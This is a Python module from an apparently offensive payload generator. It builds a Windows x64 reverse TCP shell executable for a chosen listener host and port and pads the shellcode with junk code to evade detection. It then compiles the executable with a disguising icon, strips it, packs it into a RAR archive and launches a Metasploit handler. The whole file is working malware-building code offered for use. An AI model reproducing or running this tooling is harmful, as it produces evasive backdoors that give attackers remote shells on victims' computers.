from lib import evasion, core, gen, junkcode



def Construction():

    ARCH = "x64"
    PROTOCOLE = "TCP"
    TYPE = "Shell"
    PLATFORM = "Windows"

    RC_PAYLOAD = "windows/x64/shell/reverse_tcp"

    print(core.amcolors.PURPLE + core.amcolors.PURPLE + " Payload x64 Shell Reverse TCP" + core.amcolors.ENDC)

    Gen_Payload = True

    while Gen_Payload:

        LHOST = gen.LHOST_Input()
        LPORT = gen.LPORT_Input()
        FILENAME = "output/" + gen.FILENAME_Input() + ".exe"

        print(core.amcolors.OCRA + core.amcolors.BOLD + " [*] Code generation." + core.amcolors.ENDC)

        PAYLOAD = gen.Gen_Shellcode(ARCH, PROTOCOLE, TYPE, LHOST, LPORT)

        Final_Code = junkcode.Start()

        Final_Code += "char shellcode[] = {\n"
        Final_Code += str(PAYLOAD)

        Final_Code += junkcode.End()

        with open('source.c', 'w') as f:
            f.write(Final_Code)

        ICON = gen.Add_Icon()

        print(core.amcolors.OCRA + core.amcolors.BOLD + "\n [*] Compiling." + core.amcolors.ENDC)

        gen.Auto_Compiler(FILENAME, ARCH, PLATFORM, ICON)

        print(core.amcolors.OCRA + core.amcolors.BOLD + "\n [*] Stripping executable." + core.amcolors.ENDC)

        gen.Auto_Executable_Strip(FILENAME, PLATFORM)

        gen.Compress_Rar(FILENAME)

        gen.Run_Meterpreter_Script(ARCH, PLATFORM, RC_PAYLOAD, LHOST, LPORT, TYPE)

        print(core.amcolors.GREEN + core.amcolors.BOLD + "\n [+] Complete task." + core.amcolors.ENDC)
        print(core.amcolors.GREEN + core.amcolors.BOLD + " [+] Exiting script." + core.amcolors.ENDC)

        Gen_Payload = False
